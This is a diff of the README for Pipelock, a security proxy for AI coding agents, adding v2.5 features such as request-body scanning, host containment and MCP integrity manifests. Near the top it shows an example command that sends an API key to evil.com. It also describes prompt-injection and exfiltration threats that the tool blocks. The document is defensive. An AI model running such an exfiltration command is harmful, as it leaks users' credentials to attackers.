@@ -25,9 +25,9 @@
 
 **Agent-external attestation built in.** Receipts are signed by the mediator, outside the agent process and outside its credentials, so evidence does not depend on the agent attesting to itself.
 
-**Covers MCP security, agent egress security, DLP for AI agents, and prompt injection defense.** Pipelock acts as an agent egress proxy for outbound HTTP, WebSocket, and MCP traffic, with bidirectional MCP scanning, 48 credential patterns, and 25 injection patterns with 6-pass normalization.
+**Covers MCP security, agent egress security, DLP for AI agents, and prompt injection defense.** Pipelock acts as an agent egress proxy for wrapped outbound HTTP, WebSocket, and MCP traffic, with bidirectional MCP scanning, 48 credential patterns, and 29 injection patterns with 6-pass normalization.
 
-**Works with:** Claude Code · Cursor · VS Code · JetBrains · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph
+**Works with:** Claude Code · OpenAI Codex · Cline · OpenCode · Zed · Cursor · VS Code · JetBrains · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph
 
 [Quick Start](#quick-start) · [What It Does](#what-it-does) · [Docs](docs/) · [Blog](https://pipelab.org/blog/) · [Ask Dosu](https://app.dosu.dev/bcccd1cf-be85-4c0e-ae05-edeb0ff50b59/ask)
 
@@ -39,7 +39,7 @@ Your AI agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. On
 curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
 ```
 
-Every machine action your agent takes (HTTP requests, tool calls, browser sessions) crosses a boundary between your secrets and the open internet. Pipelock sits at that boundary. It scans every outbound and inbound request, blocks exfiltration and injection, sandboxes the agent process, and generates signed evidence of what happened.
+Every machine action your agent takes (HTTP requests, tool calls, browser sessions) should cross a boundary between your secrets and the open internet. Pipelock sits at that boundary when the agent is routed through its proxy, MCP wrapper, or containment topology. It scans mediated outbound and inbound requests, blocks exfiltration and injection, sandboxes the agent process where configured, and generates signed evidence of what happened.
 
 ![Pipelock demo](assets/demo.gif)
 
@@ -107,9 +107,13 @@ pipelock mcp proxy --sandbox --config pipelock.yaml -- npx server
 
 ### Response Scanning
 
-Fetched content is scanned for prompt injection and state/control poisoning before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. 25 built-in patterns cover jailbreak phrases, instruction manipulation, credential solicitation, memory persistence, preference poisoning, covert action directives, model instruction boundaries, and CJK-language instruction overrides. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).
+Fetched content is scanned for prompt injection and state/control poisoning before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. 29 built-in patterns cover jailbreak phrases, instruction manipulation, credential solicitation, memory persistence, preference poisoning, covert action directives, model instruction boundaries, and CJK-language instruction overrides. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).
 
 `text/event-stream` responses (OpenAI chat completions, Anthropic messages, Kilo Gateway, MCP HTTP/SSE) stream through with per-event DLP and injection scanning so token-by-token LLM chat UX is preserved while body scanning stays on. Clean events flush immediately; a detection terminates the stream fail-closed. Compressed SSE streams are rejected since compressed bytes evade regex matching. See [SSE streaming guide](docs/guides/sse-streaming.md).
+
+### Request Body Scanning
+
+Outbound request bodies and headers are scanned before they leave the protected agent path. Body scanning covers JSON keys and values, ordered multi-field JSON payloads, form-encoded bodies, raw text, reverse-proxy requests, intercepted CONNECT traffic, and outbound WebSocket client frames. In enforce mode, critical DLP findings and prompt-injection findings hard-block non-provider destinations with `X-Pipelock-Block-Reason` even when `request_body_scanning.action: warn`; provider exemptions still use the existing wildcard-aware response-scanning exemption list.
 
 ### Request Redaction
 
@@ -198,6 +202,8 @@ Synthetic secrets injected into the agent's environment. If pipelock detects a c
 |---------|-------------|
 | **Audit Reports** | `pipelock report --input events.jsonl` generates HTML/JSON reports with risk rating, timeline, and evidence appendix. Ed25519 signing with `--sign`. ([Sample report](examples/sample-report.html)) |
 | **Diagnose** | `pipelock diagnose` runs 7 local checks to verify your config works end-to-end (no network required) |
+| **Enforcement Doctor** (v2.5) | `pipelock doctor` reports configured-vs-enforceable status for proxying, TLS interception, request-body scanning, Browser Shield, MCP wrapping, MCP binary integrity, tool provenance, file_sentry, Sentry, and deployment-boundary signals. |
+| **Request Body Injection Blocking** (v2.5) | Request-body prompt-injection and critical-DLP findings hard-block non-provider destinations in enforce mode across forward, reverse, TLS-intercept, and WebSocket transports, with block-reason headers for operator-visible diagnosis. |
 | **TLS Interception** | Optional CONNECT tunnel MITM: decrypt, scan bodies/headers/responses, re-encrypt. `pipelock tls init` generates a CA, then `pipelock tls install-ca` trusts it system-wide. |
 | **Block Hints** | Opt-in `explain_blocks: true` adds fix suggestions to blocked responses |
 | **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
@@ -207,6 +213,7 @@ Synthetic secrets injected into the agent's environment. If pipelock detects a c
 | **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |
 | **Session Profiling** | Per-session behavioral analysis (domain bursts, volume spikes) |
 | **Adaptive Enforcement** | Per-session threat score with automatic escalation from warn to block, de-escalation timers, and domain burst detection |
+| **Adaptive Operator CLI** (v2.5) | `pipelock adaptive status / flush / whoami` exposes runtime adaptive state through the authenticated admin API. See [`docs/cli/adaptive.md`](docs/cli/adaptive.md). |
 | **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
 | **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
 | **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |
@@ -215,11 +222,16 @@ Synthetic secrets injected into the agent's environment. If pipelock detects a c
 | **Denial-of-Wallet** | Per-agent budgets for retries, fan-out, and concurrent tool calls. Catches loop storms and amplification attacks. |
 | **Taint Escalation** | Exposure-based policy escalation across MCP + task boundaries. Sessions that recently observed untrusted content get elevated scanning on protected operations until trust is explicitly restored. |
 | **Mediation Envelope** | RFC 8941 sideband metadata on forwarded HTTP requests and MCP `_meta`, carrying action type, verdict, actor identity, policy hash, taint context, and receipt correlation ID. v2.4 adds inbound verification with replay protection, SPIFFE actor format, and an RFC 9421 well-known signing-key directory at `/.well-known/http-message-signatures-directory`. See [federation guide](docs/guides/federation.md). |
-| **Receipt Conformance** | Cross-implementation receipt verification suite (`sdk/conformance/`) plus the reference Python verifier ([pipelock-verify-python](https://github.com/luckyPipewrench/pipelock-verify-python)), so receipts can be verified outside the Go implementation. v2.4 adds `EvidenceReceipt v2` for learn-and-lock lifecycle and shadow evidence; the Go reference verifies v2 receipts today, and a prepared `pipelock-verify-python` 0.2.0 update adds v1 chains plus individual v2 receipts once published. v2 chain verification remains a follow-up. |
+| **Receipt Conformance** | Cross-implementation receipt verification suite (`sdk/conformance/`) plus the reference Python verifier ([pipelock-verify-python](https://github.com/luckyPipewrench/pipelock-verify-python)), so receipts can be verified outside the Go implementation. v2.4 adds `EvidenceReceipt v2` for learn-and-lock lifecycle and shadow evidence; the Go reference verifies v2 receipts today. v2.5 adds first-party Go, TypeScript, and Rust verifiers for Audit Packet v0. Python Audit Packet verification and EvidenceReceipt v2 chain verification remain follow-up work. |
 | **Learn-and-Lock** (v2.4) | Per-agent behavioral contracts: observe an agent's real traffic, compile a signed candidate contract, replay captured observations in shadow, ratify per rule, promote the signed active manifest, and **enforce live** on every URL-bearing transport plus the MCP tool-call surface (forward, reverse + redirect, intercept, /fetch, WebSocket, MCP HTTP, MCP stdio bridge, MCP stdio subprocess). Lifecycle, shadow, and runtime `proxy_decision` receipts use `EvidenceReceipt v2`, chained to the active manifest hash. Scanner block always wins over contract allow on every gated path. See [learn-and-lock guide](docs/guides/learn-and-lock.md). |
 | **Block-Reason Header** (v2.4) | `X-Pipelock-Block-Reason` response header on every HTTP-capable block path (forward / intercept / fetch / reverse / MCP HTTP / WebSocket close-frame payload) with a fixed reason vocabulary, severity tier, and retry hint. MCP-internal JSON-RPC blocks (`tool_poisoning`, `tool_chain_blocked`, MCP stdio) carry the same reason vocabulary on the JSON-RPC error metadata where there is no HTTP response surface. Lets agents react intelligently to a block without parsing the body. See [block-reason header](docs/guides/block-reason-header.md). |
 | **Wedge-Detection Watchdog** (v2.4) | `health_watchdog` returns `/health` 503 when a subsystem heartbeat goes stale (proxy hot path, MCP listeners, rules-engine reload watcher), so cluster liveness probes detect a wedged scanner automatically. Optional `expose_subsystems: true` adds a per-subsystem map for operator dashboards. See [health endpoint guide](docs/guides/health.md). |
 | **Redaction Provider Plugin Shape** (v2.4) | First-party redaction parsers ship for Anthropic, OpenAI, and Gemini chat APIs. The provider-plugin shape (`internal/redact/providers.go::DefaultProviderSpecs()`) lets a third-party LLM provider register a body parser without forking the redact package. Wired through forward / intercept / reverse / WebSocket transports. |
+| **Audit Packet v0 Schema + Verifiers** (v2.5) | First-party canonical Audit Packet schema with Go, TypeScript, and Rust verifier implementations, plus a standalone [`pipelock-verifier`](cmd/pipelock-verifier/) CLI. Auditors, SIEMs, and procurement reviewers validate signed evidence without running Pipelock. Schema lives under [`sdk/audit-packet/`](sdk/audit-packet/); verifier packages live under [`sdk/verifiers/`](sdk/verifiers/). |
+| **Host Containment Lifecycle** (v2.5) | `pipelock contain install / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` manages a 3-UID containment model (operator / pipelock-proxy / pipelock-agent) end to end. nftables owner-match rules force the contained agent user through Pipelock on loopback; install pins the binary hash for TOFU integrity checks, and workspace ACL subcommands grant/revoke project access without opening system paths by default. See [`docs/contain-cli.md`](docs/contain-cli.md). |
+| **MCP Integrity Manifests** (v2.5) | `pipelock mcp integrity manifest generate / verify / sign / verify-signature` pins MCP server binaries/scripts by hash and can require a trusted manifest signature before subprocess launch. See [`docs/cli/mcp-integrity.md`](docs/cli/mcp-integrity.md). |
+| **Kubernetes MCP Launcher Contract** (v2.5) | `pipelock init sidecar --mcp-upstream` emits the companion MCP listener, service port, workload annotations, NetworkPolicy allowance, `PIPELOCK_MCP_PROXY_URL`, and mounted `PIPELOCK_MCP_CONFIG`. The agent launcher or MCP client must consume one of those values for MCP traffic to traverse Pipelock. See [`docs/cli/init-sidecar.md`](docs/cli/init-sidecar.md). |
+| **Federation Strict Mode** (v2.5) | Inbound mediation-envelope verification now requires SPIFFE-format actors by default, contract tombstones are enforced at activation and accepted-load time, and a new `pipelock envelope trust add/list/remove/verify` operator CLI manages the local trust list. See [federation guide](docs/guides/federation.md). |
 | **Media Policy** | Controls media response handling: strips steganographic metadata from JPEG/PNG (byte-level surgery, pixel-identical output), rejects audio/video by default, hardens SVG active content (foreignObject, event handlers, external hrefs), and enforces image size limits against decompression bombs. |
 | **Compliance Mappings** | OWASP MCP Top 10, OWASP Agentic Top 15, NIST 800-53, EU AI Act, SOC 2 coverage documentation |
 
@@ -229,7 +241,7 @@ Synthetic secrets injected into the agent's environment. If pipelock detects a c
 
 ## How It Works
 
-Pipelock uses **capability separation**: the agent process has secrets but no direct network access. Pipelock has network access but no agent secrets. Even if the agent gets prompt-injected, it can't reach the firewall's controls.
+Pipelock uses **capability separation**: in an enforced deployment, the agent process has secrets but no direct network access. Pipelock has network access but no agent secrets. Even if the agent gets prompt-injected, it can't reach the firewall's controls.
 
 Three HTTP proxy modes (same port), plus dedicated MCP and A2A proxies:
 
@@ -309,7 +321,7 @@ What each mode prevents, detects, or logs:
 | Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
 | Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |
 
-> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`), pipelock adds OS-level containment (Landlock + network namespaces + seccomp) on top of content inspection. The agent can't bypass the proxy because it has no direct network access.
+> **Honest assessment:** Strict mode blocks outbound HTTP that traverses Pipelock except allowlisted API domains, so there is no exfiltration channel through the proxy itself. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`) or the host/cluster containment topology enforced, pipelock adds an OS or deployment boundary on top of content inspection. Direct egress still has to be blocked by that boundary for non-cooperative tools that ignore proxy settings.
 
 ## Configuration
 
@@ -343,6 +355,9 @@ For false positive tuning: **[docs/false-positive-tuning.md](docs/false-positive
 
 - **[Claude Code](docs/guides/claude-code.md):** MCP proxy setup, `.claude.json` configuration
 - **[OpenAI Codex](docs/guides/codex.md):** MCP proxy wrapping, forward proxy, sandbox integration
+- **[Cline](docs/guides/cline.md):** MCP proxy wrapping for Cline's `mcp.json`
+- **[OpenCode](docs/guides/opencode.md):** MCP proxy wrapping for OpenCode's local and remote MCP servers
+- **[Zed](docs/guides/zed.md):** MCP proxy wrapping for Zed's `context_servers` block in `settings.json`
 - **[OpenAI Agents SDK](docs/guides/openai-agents.md):** `MCPServerStdio`, multi-agent handoffs
 - **[Google ADK](docs/guides/google-adk.md):** `McpToolset`, `StdioConnectionParams`
 - **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
@@ -454,13 +469,15 @@ Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-m
 | [False Positive Tuning](docs/false-positive-tuning.md) | Identifying, suppressing, and tuning scanner findings |
 | [Scan API](docs/scan-api.md) | Evaluation endpoint for programmatic scanning |
 | [Deployment Recipes](docs/guides/deployment-recipes.md) | Docker Compose, K8s sidecar, iptables, macOS PF |
+| [`pipelock doctor`](docs/cli/doctor.md) | Configured-vs-enforceable deployment diagnostics for proxy, TLS, MCP, file_sentry, telemetry, and containment signals |
+| [`pipelock verify-install`](docs/cli/verify-install.md) | Deterministic scanning, local proof, and direct-egress smoke checks |
 | [Bypass Resistance](docs/bypass-resistance.md) | Known evasion techniques, mitigations, limitations |
 | [Known Attacks Blocked](docs/attacks-blocked.md) | Real attacks with repro snippets |
 | [SIEM Integration](docs/guides/siem-integration.md) | Log schema, forwarding patterns, SIEM queries |
 | [Metrics Reference](docs/metrics.md) | Prometheus metric families, labels, JSON stats, and alert rules |
 | [Community Rules](docs/rules.md) | Install, configure, and create signed rule bundles |
 | [Security Assurance](docs/security-assurance.md) | Security model, trust boundaries, supply chain |
-| [Security Documents](docs/security/) | Disclosure policy, unsupported paths, key rotation, TLS CA threat model |
+| [Security Documents](docs/security/) | Disclosure policy, unsupported paths, key rotation, TLS CA and Audit Packet threat models |
 | [Finding Suppression](docs/guides/suppression.md) | Rule names, path matching, inline comments |
 | [Transport Modes](docs/guides/transport-modes.md) | All proxy modes and their scanning capabilities |
 | [OWASP MCP Top 10](docs/compliance/owasp-mcp-top10.md) | OWASP MCP Top 10 coverage |
@@ -470,14 +487,18 @@ Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-m
 | [Policy Spec v0.1](docs/policy-spec-v0.1.md) | Portable agent firewall policy format |
 | [Mediation Envelope](docs/guides/mediation-envelope.md) | Sideband metadata headers, config, interaction with receipts |
 | [Media Policy](docs/guides/media-policy.md) | Stego stripping, SVG hardening, allowed types, size limits |
-| [Receipt Verification](docs/guides/receipt-verification.md) | verify-receipt CLI, conformance suite, chain integrity |
+| [Receipt Verification](docs/guides/receipt-verification.md) | `pipelock verify-receipt`, standalone `pipelock-verifier`, conformance suite, chain integrity |
+| [Audit Packet Threat Model](docs/security/audit-packet-threat-model.md) | What verified Audit Packets prove, what they do not prove, and the trust assumptions relying parties must pin |
 | [Receipt Transport Coverage](docs/guides/receipt-transports.md) | Receipt emission matrix across fetch, forward, CONNECT/TLS, WebSocket, MCP, and A2A paths |
 | [Learn-and-Lock](docs/guides/learn-and-lock.md) | Per-agent behavioral contracts: observe, compile, shadow, ratify, promote (v2.4) |
 | [Federation](docs/guides/federation.md) | Inbound mediation envelope verification, SPIFFE actor format, RFC 9421 well-known directory (v2.4) |
 | [Block-Reason Header](docs/guides/block-reason-header.md) | `X-Pipelock-Block-Reason` schema, reason vocabulary, retry hints (v2.4) |
 | [Health Endpoint](docs/guides/health.md) | `/health` 503 wedge detection, subsystem heartbeats, operator dashboard config (v2.4) |
+| [Host Containment](docs/contain-cli.md) | `pipelock contain install / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` for 3-UID kernel-enforced agent containment (v2.5) |
+| [MCP Integrity Manifests](docs/cli/mcp-integrity.md) | Generate, verify, sign, and require trusted MCP binary-integrity manifests (v2.5) |
+| [Adaptive CLI](docs/cli/adaptive.md) | Inspect and flush adaptive-enforcement runtime state through the admin API (v2.5) |
 | [Posture Capsule](docs/guides/posture-capsule.md) | Signed posture snapshots, `posture verify` CLI, CI gate, scoring model |
-| [`pipelock init sidecar`](docs/cli/init-sidecar.md) | Generate enforced Kubernetes companion-proxy manifests (strategic-merge, Kustomize, Helm values) |
+| [`pipelock init sidecar`](docs/cli/init-sidecar.md) | Generate enforced Kubernetes companion-proxy manifests and MCP launcher contracts (strategic-merge, Kustomize, Helm values) |
 | [`pipelock session`](docs/cli/session.md) | Operator CLI for airlock inspection and recovery (list, inspect, explain, release, terminate, recover) |
 | [Badges](docs/badges.md) | Drop-in Markdown for the `scanned by pipelock` badge on downstream projects |
 
@@ -487,6 +508,7 @@ Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-m
 cmd/pipelock/          CLI entry point
 internal/
   cli/                 20+ Cobra commands (run, check, init, generate, mcp, session, posture, rules, ...)
+    diag/              `pipelock doctor` and install-verification diagnostics
     session/           `pipelock session` operator CLI — airlock inspection and recovery
     setup/             `pipelock init sidecar` — companion-proxy manifest generation (K8s)
   config/              YAML config, validation, defaults, hot-reload (fsnotify)
@@ -494,6 +516,7 @@ internal/
   audit/               Structured JSON logging (zerolog) + event emission dispatch
   proxy/               HTTP proxy: fetch, forward (CONNECT), WebSocket, DNS pinning, TLS
   mcp/                 MCP proxy + bidirectional scanning + tool poisoning + chains
+    integrity/         MCP binary/script integrity manifests and trust workflow
   discover/            IDE/agent config discovery (Claude Code, Cursor, VS Code, JetBrains)
   killswitch/          Emergency deny-all (4 sources) + port-isolated API
   envelope/            Mediation envelope (RFC 8941) for sideband metadata
